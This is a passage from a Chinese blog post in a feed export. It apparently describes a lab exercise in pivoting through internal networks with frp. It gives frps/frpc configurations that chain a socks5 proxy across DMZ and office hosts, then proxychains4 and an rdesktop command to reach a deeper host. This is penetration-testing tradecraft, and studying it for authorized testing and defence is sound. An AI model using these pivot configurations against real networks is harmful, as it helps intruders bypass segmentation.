在Windows Server 2012服务端上绑定的IP地址</span></span><br><span class="line">bind_port = 7000       <span class="comment"># 在服Windows Server 2012服务端上绑定的端口</span></span><br></pre></td></tr></table></figure><ol start="4"><li>在<strong>DMZ区</strong>的10.10.10.15 Ubuntu上执行，启动一个客户端</li></ol><p>启动frp客户端，链接上Web服务端，将本地10808端口转发到Windows Server 2012的10808端口上。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.\frpc -c .\frpc.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frpc.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 10.10.10.13      <span class="comment"># 指向Windows Server 2012 frp服务端绑定的ip地址</span></span><br><span class="line">server_port = 7000             <span class="comment"># 指向Windows Server 2012 frp服务端绑定的端口</span></span><br><span class="line">[socks5_forward]</span><br><span class="line"><span class="built_in">type</span> = tcp                     <span class="comment"># 所使用的协议类型</span></span><br><span class="line">local_ip = 192.168.30.40       <span class="comment"># 本地监听的IP地址</span></span><br><span class="line">local_port = 10809             <span class="comment"># 要转发的本地端口</span></span><br><span class="line">remote_port = 10808            <span class="comment"># 要转发到的远程端口</span></span><br></pre></td></tr></table></figure><ol start="5"><li>在DMZ区的10.10.10.15 Ubuntu上再启动一个frp服务端</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frps.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 192.168.30.40      <span class="comment"># 指定frp服务器端ip地址</span></span><br><span class="line">bind_port = 7000               <span class="comment"># 指定frp服务端绑定端口</span></span><br></pre></td></tr></table></figure><ol start="6"><li>在办公区的文件服务器上执行</li></ol><p>启动frp客户端，链接Ubuntu的frp服务端，并在10809端口上启动socks5代理服务后，转发到Ubuntu服务器的10809端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.\frpc.exe -c .\frpc.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frpc.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.30.40    <span class="comment"># 指向Ubantu服务器上的 frp 服务端IP地址</span></span><br><span class="line">server_port = 7000             <span class="comment"># 指向Ubantu服务器上的 frp 服务端端口</span></span><br><span class="line">[socks5]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">remote_port = 10809            <span class="comment"># 代理所用的端口，会被转发到服务器</span></span><br><span class="line">plugin = socks5                <span class="comment"># 代理类型</span></span><br></pre></td></tr></table></figure><ol start="7"><li>编辑proxychains4的配置文件：/etc/proxychains4.conf </li></ol><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/b897624a4285bd1d9040d74d16ad340a.png" alt="image-20221103171204998"></p><ol start="8"><li>命令前加上proxychains4</li></ol><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">proxychinas4</span> rdesktop <span class="number">192.168.60.10</span></span><br></pre></td></tr></table></figure><p>参考：《内网渗透体系建设》</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;frp之一层网络代理-二层网络代理-三层网络代理&quot;&gt;&lt;a href=&quot;#frp之一层网络代理-二层网络代理-三层网络代理&quot; class=&quot;headerlink&quot; title=&quot;frp之一层网络代理 / 二层网络代理 / 三层网络代理&quot;&gt;&lt;/a&gt;frp之一层网络代理</summary>
      
    
    
    
    
    <category term="内网" scheme="https://z4ynadmin.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
    <category term="代理" scheme="https://z4ynadmin.github.io/tags/%E4%BB%A3%E7%90%86/"/>
    
    <category term="frp" scheme="https://z4ynadmin.github.io/tags/frp/"/>
    
  </entry>
  
</feed>
